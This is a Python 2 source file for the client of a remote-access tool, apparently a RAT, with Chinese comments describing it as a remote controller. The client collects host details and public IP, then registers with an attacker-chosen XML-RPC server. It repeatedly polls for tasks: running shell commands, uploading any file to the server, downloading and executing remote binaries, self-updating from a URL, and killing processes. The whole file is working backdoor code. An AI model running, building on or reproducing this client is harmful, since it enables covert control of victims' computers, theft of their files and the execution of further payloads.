#! /usr/bin/env python
# coding=utf-8

import xmlrpclib
import time, subprocess
import urllib
import shutil, signal
import sys
import os, uuid
import platform
import socket


class ClientInfo():
    """
    获取机器信息
    """

    def GetClientId(self):
        """
        获取客户端的id
        进行UUID计算 (计算机的名字+uid)
        :return:
        """
        name = socket.gethostname()
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
        return name + '-' + mac

    def GetLocalIp(self):
        """
        获取本地ip
        :return:
        """
        return socket.gethostbyname(socket.gethostname())

    def GetPublicIp(self):
        """
        获取外网ip
        :return:
        """
        # http://www.jb51.net/article/57997.htm
        import re, urllib2
        def visit(url):
            opener = urllib2.urlopen(url)
            if url == opener.geturl():
                s = opener.read()
                return re.search('\d+\.\d+\.\d+\.\d+', s).group(0)
            return ''

        try:
            ip = visit("http://2017.ip138.com/ic.asp")
        except:
            try:
                ip = visit("http://m.tool.chinaz.com/ipsel")
            except:
                ip = "unknown"
        return ip

    def GetOsVersion(self):
        """
        获取计算机名字
        :return:
        """
        uname = list(platform.uname())
        # print sys.platform, uname
        return str(uname[0]) + str(uname[3])

    def GetClientInfo(self):
        info = {
            "uname": os.environ['USERNAME'] if sys.platform == 'win32' else os.environ['USER'],
            "osver": self.GetOsVersion(),
            "lip": self.GetLocalIp(),
            "rip": self.GetPublicIp(),
        }
        return info


# 判断window
if sys.platform == 'win32':
    PYRATCLI = 'pyratcli.exe'
else:
    PYRATCLI = 'pyratcli'


class XmlCli():
    # 版本
    PYRAT_CLIENT_VERSION = '0.1.1'

    def __init__(self, svr):
        """
        初始化
        :param svr:
        """
        # 客户端执行的方法类
        self.cmdmap = {
            'cmdshell': self.cmdshell,
            'update': self.update,
            'download': self.download,
            'runexec': self.runexec,
            'upload': self.upload,
            'terminate': self.terminate_proc,
            'uninstall': self.uninstall
        }
        # XmlRPC server 地址
        self.svr = svr
        # 连接XmlRPC server地址，执行server的注册函数，上报agent信息
        self.hello()

    def hello(self):
        """
        :return:
        """
        ci = ClientInfo()

        # 获取机器id
        self.id = ci.GetClientId()
        # 获取机器信息
        info = ci.GetClientInfo()

        while True:
            try:
                self.cli = xmlrpclib.ServerProxy(self.svr, allow_none=True)
                # 执行服务端的注册函数hello 上报自己的机器信息(client -->server)
                self.cli.hello(self.id, XmlCli.PYRAT_CLIENT_VERSION, info)
                break
            except Exception as e:
                print "[!] mlrpclib.ServerProxy on hello err:", e
                # 服务端连接端口 超时了
                # 过半分钟在连接
                time.sleep(30)
                continue

    def run(self):
        while True:
            try:
                # 监听服务端发来的信息(server--->client)
                # get_task 这个是在服务端的注册方法，会修改client的lasttime 用于判断机器是不是存在（类似心跳的掉线）
                # 发起一次请求(类似http请求) 查看服务器也没有任务发下来啦
                task = self.cli.get_task(self.id)
                if task:
                    # print task
                    (tid, cid, task, argv, ttime) = task
                    # for debug
                    # if task == 'quit':
                    #    break
                    # ret = eval("cli."+task+"()")
                    method = self.cmdmap.get(task)
                    if method:
                        # 执行对应方法 比如执行命令或者写文件等
                        (ret, data) = method(argv)
                        # 将执行服务器注册函数，结果返回给服务端(client -->server)
                        self.cli.resp_task(cid, tid, task, argv, ret, data)
                # 调小点
                time.sleep(0.1)
            except Exception as e:
                print e
                self.hello()

        self.close()

    def close(self):
        self.cli.close(self.id)

    def __write_file(self, path, data):
        """
        写文件
        :param path:
        :param data:
        :return:
        """
        f = file(path, 'wb')
        f.write(data)
        f.close()

    def __read_file(self, path):
        """
        读文件
        :param path:
        :return:
        """
        f = file(path, 'rb')
        d = f.read()
        f.close()
        return d

    def uninstall(self, argv):
        """
        结束进程 删除这个远控
        :param argv:
        :return:
        """
        try:
            # 这里先别删除
            # os.remove(PYRATCLI)
            os._exit(0)
            return (True, "")
        except Exception as e:
            return (False, str(e))

    def update(self, url):
        """
        更新远控
        :param url:
        :return:
        """
        try:
            req = urllib.urlopen(url)
            data = req.read()
            self.__write_file('tmp', data)
            os.remove(PYRATCLI)
            shutil.move('tmp', PYRATCLI)
            cmd = PYRATCLI
            self.runexec(cmd)
            return (True, '')
        except Exception as e:
            return (False, str(e))

    def download(self, argv):
        """
        下载内容
        :param argv:
        :return:
        """
        try:
            (dtype, url, path) = argv.split(' ')
            if dtype == 'net':
                req = urllib.urlopen(url)
                data = req.read()
            elif dtype == 'local':
                (ret, data) = self.cli.download(url)
                if not ret:
                    return (False, data)
                data = data.data
            else:
                return (False, 'Unknow:' + dtype)
            self.__write_file(path, data)
            return (True, 'download success')
        except Exception as e:
            return (False, str(e))

    def upload(self, argv):
        """
        上传内容
        :param argv:
        :return:
        """
        try:
            path = argv
            data = self.__read_file(path)
            return (True, xmlrpclib.Binary(data))
        except Exception as e:
            return (False, str(e))

    def cmdshell(self, cmd):
        """
        执行命令
        :param cmd:
        :return:
        """
        try:
            # https://www.cnblogs.com/yangykaifa/p/7127776.html
            # cmd = 'cmd.exe /c %s &' % cmd
            # log = 'cmd.log'
            # p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
            # p.wait()
            # data = self.__read_file(log)
            data = os.popen(cmd).read()
            return (True, xmlrpclib.Binary(data))
        except Exception as e:
            return (False, str(e))

    def runexec(self, path):
        """
        启动二进制程序
        :param path:
        :return:
        """
        try:
            subprocess.Popen(path)
            return (True, '')
        except Exception as e:
            return (False, str(e))

    def terminate_proc(self, argv):
        """
        结束程序
        :param argv:
        :return:
        """
        try:
            (ptype, val) = argv.split(' ')
            # ptype = '/PID' if ptype == 'pid' else '/IM'
            # cmd = 'cmd.exe /c taskkill %s %s' % (ptype, val)
            # log = 'cmd.log'
            # p = subprocess.Popen(cmd, stdout=file(log, 'w'), stderr=subprocess.STDOUT)
            # p.wait()
            # data = self.__read_file(log)
            # https://www.cnblogs.com/xjh713/p/6306587.html?utm_source=itdadao&utm_medium=referral
            if sys.platform == 'win32':
                ptype = '/PID' if ptype == 'pid' else '/IM'
                data = os.popen('taskkill %s %s' % (ptype, val)).read()
            else:
                os.kill(val, signal.SIGKILL)
            return (True, xmlrpclib.Binary(data))
        except Exception as e:
            return (False, str(e))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print '[*] usage: %s ip port' % PYRATCLI
        os._exit(0)
    url = "http://%s:%s" % (sys.argv[1], sys.argv[2])
    xc = XmlCli(url)
    xc.run()
